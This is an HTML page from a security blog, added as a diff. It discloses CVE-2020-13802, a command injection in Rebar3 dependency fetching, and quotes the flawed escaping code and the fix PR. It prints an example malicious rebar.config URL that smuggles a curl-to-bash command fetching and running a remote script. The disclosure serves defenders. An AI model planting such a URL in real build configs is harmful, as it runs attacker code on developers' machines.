@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="author" content="Alexey Pronin">
+  
+  <link rel="canonical" href="../../post/rebar3-command-injection/" />
+  <meta name="theme-color" content="#563d7c">
+  
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <title>OS command injection in Rebar3 - vuln.be</title>
+  <link href="../../css/main.css" rel="stylesheet">
+  
+  <link rel="alternate" type="application/atom+xml" href="../../atom.xml" title="vuln.be Atom Feed">
+  <link rel="alternate" type="application/rss+xml" href="../../rss.xml" title="vuln.be RSS Feed">
+</head>
+
+<body>
+  <div class="container">
+    <header class="blog-header py-3">
+      <div class="row flex-nowrap justify-content-between align-items-center">
+        <div class="col-12 text-center">
+          <a class="blog-header-logo text-dark" href="../../">VULN.BE</a>
+      </div>
+    </header>
+
+    <div class="nav-scroller py-1 mb-4 border-bottom">
+      <nav class="nav d-flex justify-content-between">
+        <a class="p-2 text-muted" href="../../">Home</a><a class="p-2 text-muted" href="../../tags/">Tags</a><a class="p-2 text-muted" href="../../archives/">Archives</a><a class="p-2 text-muted" href="../../page/contacts/">Contacts</a><a class="p-2 text-muted" href="../../page/about/">About</a>
+      </nav>
+    </div>
+    
+    <div class="blog-main px-2 my-4">
+      <div class="blog-post">
+  <div class="blog-post-meta font-weight-light">
+    <time datetime="2020-09-01" pubdate class="text-uppercase" data-updated="true"> 1 September 2020</time>
+    <div class="tags text-lowercase"><a href="../../tags/rebar3/">rebar3</a> | <a href="../../tags/os command injection/">os command injection</a> | <a href="../../tags/CVE-2020-13802/">CVE-2020-13802</a> | <a href="../../tags/shell injection/">shell injection</a> | <a href="../../tags/injection/">injection</a> | <a href="../../tags/CVE/">CVE</a> | <a href="../../tags/erlang/">erlang</a></div>
+  </div>
+  <h1 class><a href="../../post/rebar3-command-injection/">OS command injection in Rebar3</a></h1>
+  
+  <div class="mb-4 post-content">
+    <p>Rebar3 is a tool widely used for building applications in the Erlang world. It is quite dangerous. With the tool, you can get OS command execution in different ways and sometimes in ways not intended by developers.</p>
+<!--more-->
+<p>While examining this tool, I came across the strange processing of URLs contained in <code>rebar.config</code> file. Improperly filtered data sent to the shell resulted in the execution of arbitrary commands in the operating system.</p>
+<video style="width:100%" controls src="../../videos/rebar3-command-injection-poc.mp4" type="video/mp4"></video>
+<p>Command injection occurs on a step of fetching dependencies, which makes the exploitation vector attractive. You can find the proof of concept code here: <a href="https://github.com/vulnbe/poc-rebar3">https://github.com/vulnbe/poc-rebar3</a>.</p>
+<p>To exploit the vulnerability, any of the Rebar3 actions must be performed, including <code>clean</code>, <code>compile</code>, <code>cover</code>, <code>ct</code>, <code>deps</code>, <code>dialyzer</code>, <code>edoc</code>, <code>escriptize</code>, <code>eunit</code>, <code>get-deps</code>, <code>release</code>, <code>relup</code>, <code>shell</code>, <code>tar</code>, <code>tree</code>, <code>upgrade</code> and <code>xref</code>.</p>
+<p>The malicious URL in <code>rebar.config</code> may look like this: <code>https://github.com/vulnbe/dephelper.git?repo=main&amp;threadId=19:428af44abb014e318e7d225a4a88acc2@thread.tacv2&amp;ctx=channel|curl\t-fsSL\thttps://gist.githubusercontent.com/vulnbe/6e5ec8fae3bdbee8e5f11f15c1462e48/raw/94616f0ee52935fda458c889d6f686958c79a2c8/poc.sh|bash\t-|git\tclone\thttps://github.com/vulnbe/dephelper.git</code></p>
+<p>The principal problem is posed by the function <a href="https://github.com/erlang/rebar3/blob/d18e1bea05aa21a92bdbb480643077c0c8b4a00d/src/rebar_utils.erl#L179">sh</a>, which called from numerous sources, including those with potentially dangerous inputs.</p>
+<p>An example of an unsafe call to <code>sh</code> function:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode erlang"><code class="sourceCode erlang"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="fu">rebar_utils:sh(?</span><span class="va">FMT</span><span class="fu">(</span><span class="st">&quot;hg clone -q -r ~ts ~ts ~ts&quot;</span><span class="fu">,</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a>                        <span class="fu">[rebar_utils:escape_chars(</span><span class="va">Ref</span><span class="fu">),</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a>                         <span class="fu">rebar_utils:escape_chars(</span><span class="va">Url</span><span class="fu">),</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a>                         <span class="fu">rebar_utils:escape_chars(filename:basename(</span><span class="va">Dir</span><span class="fu">))]),</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a>                   <span class="fu">[{</span><span class="ch">cd</span><span class="fu">,</span> <span class="fu">filename:dirname(</span><span class="va">Dir</span><span class="fu">)}]);</span></span></code></pre></div>
+<p>The only <code>rebar_utils:escape_chars</code> guards whether the data will remain data or become a command.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode erlang"><code class="sourceCode erlang"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="fu">escape_chars(</span><span class="va">Str</span><span class="fu">)</span> <span class="op">-&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a>    <span class="fu">re:replace(</span><span class="va">Str</span><span class="fu">,</span> <span class="st">&quot;([ ()?`!$&amp;;\&quot;\'])&quot;</span><span class="fu">,</span> <span class="st">&quot;\\\\&amp;&quot;</span><span class="fu">,</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a>               <span class="fu">[</span><span class="ch">global</span><span class="fu">,</span> <span class="fu">{</span><span class="ch">return</span><span class="fu">,</span> <span class="ch">list</span><span class="fu">},</span> <span class="ch">unicode</span><span class="fu">]).</span></span></code></pre></div>
+<p>The vulnerability is fixed in the pull request <a href="https://github.com/erlang/rebar3/pull/2302">#2302</a>. The flaws of such a fix are clear. Thus, versions 3.0.0-beta.3 to 3.13.2 of Rebar3 are vulnerable.</p>
+<p>Making the proper fix to prevent the mixing of data and instructions is difficult. Because there are so many dangerous places in the tool, developers do not want to consider issues as vulnerabilities and address them.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/vulnbe/poc-rebar3/">PoC</a></li>
+<li><a href="https://github.com/erlang/rebar3/pull/2302">Vulnerability remediation PR</a></li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13802">CVE-2020-13802</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</a></li>
+</ul>
+  </div>
+  
+</div>
+
+    </div>
+    <footer class="p-2 d-flex justify-content-between blog-footer font-weight-lighter border-top">
+      <p>Copyright © 2023 Alexey Pronin</p>
+      <p>Powered by <a href="https://jaspervdj.be/hakyll/">Hakyll</a>.</p>
+    </footer>
+  </div>
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+</body>
+</html>
